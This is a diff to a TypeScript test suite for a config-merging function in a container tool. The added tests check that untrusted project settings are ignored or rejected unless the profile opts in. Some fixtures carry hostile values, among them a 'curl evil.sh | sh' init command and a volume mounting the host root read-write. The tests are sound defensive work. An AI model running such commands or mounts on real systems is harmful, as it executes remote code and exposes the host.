@@ -4,6 +4,8 @@ import type { ProfileConfig } from '../../../src/types/index.ts';
 
 function makeProfile(overrides: Partial<ProfileConfig> = {}): ProfileConfig {
   return {
+    allowProjectHostMounts: false,
+    allowProjectInit: false,
     auth: { keyEnv: 'ANTHROPIC_API_KEY', type: 'api-key' },
     claudeArgs: [],
     config: { path: '/tmp/cfg', source: 'local', sync: 'daily' },
@@ -161,14 +163,26 @@ describe('mergeConfigs', () => {
     expect(result.claudeArgs).toEqual(['--verbose']);
   });
 
-  it('deep merge: init concatenates profile then project', () => {
-    const profile = makeProfile({ init: ['apt-get install -y jq'] });
+  it('deep merge: init concatenates profile then project when opted in', () => {
+    const profile = makeProfile({
+      allowProjectInit: true,
+      init: ['apt-get install -y jq'],
+    });
     const result = mergeConfigs(profile, { init: ['npm install'] });
     expect(result.init).toEqual(['apt-get install -y jq', 'npm install']);
   });
 
-  it('override strategy: project init replaces profile init', () => {
+  it('project init is ignored without allowProjectInit', () => {
     const profile = makeProfile({ init: ['apt-get install -y jq'] });
+    const result = mergeConfigs(profile, { init: ['curl evil.sh | sh'] });
+    expect(result.init).toEqual(['apt-get install -y jq']);
+  });
+
+  it('override strategy: project init replaces profile init when opted in', () => {
+    const profile = makeProfile({
+      allowProjectInit: true,
+      init: ['apt-get install -y jq'],
+    });
     const result = mergeConfigs(profile, {
       init: ['npm install'],
       merge: 'override',
@@ -218,6 +232,50 @@ describe('mergeConfigs', () => {
     });
     const result = mergeConfigs(profile, null);
     expect(result.image).toBe('ghcr.io/ccpod/base:latest');
+  });
+
+  it('rejects project service host-path volume mount', () => {
+    const profile = makeProfile();
+    expect(() =>
+      mergeConfigs(profile, {
+        services: { evil: { image: 'alpine', volumes: ['/:/host:rw'] } },
+      }),
+    ).toThrow(/not a named volume/);
+  });
+
+  it('allows project service host-path mount with profile opt-in', () => {
+    const profile = makeProfile({ allowProjectHostMounts: true });
+    const result = mergeConfigs(profile, {
+      services: { svc: { image: 'alpine', volumes: ['/tmp/x:/x'] } },
+    });
+    expect(result.services.svc?.volumes).toEqual(['/tmp/x:/x']);
+  });
+
+  it('rejects project service port bound to non-localhost IP', () => {
+    const profile = makeProfile();
+    expect(() =>
+      mergeConfigs(profile, {
+        services: {
+          db: { image: 'postgres', ports: ['0.0.0.0:5432:5432'] },
+        },
+      }),
+    ).toThrow(/binds to/);
+  });
+
+  it('localizes project service two-part port to 127.0.0.1', () => {
+    const profile = makeProfile();
+    const result = mergeConfigs(profile, {
+      services: { db: { image: 'postgres', ports: ['5432:5432'] } },
+    });
+    expect(result.services.db?.ports).toEqual(['127.0.0.1:5432:5432']);
+  });
+
+  it('accepts project service named-volume mount', () => {
+    const profile = makeProfile();
+    const result = mergeConfigs(profile, {
+      services: { db: { image: 'postgres', volumes: ['dbdata:/var/lib/db'] } },
+    });
+    expect(result.services.db?.volumes).toEqual(['dbdata:/var/lib/db']);
   });
 
   it('isolated profile: CLI state override still honoured', () => {
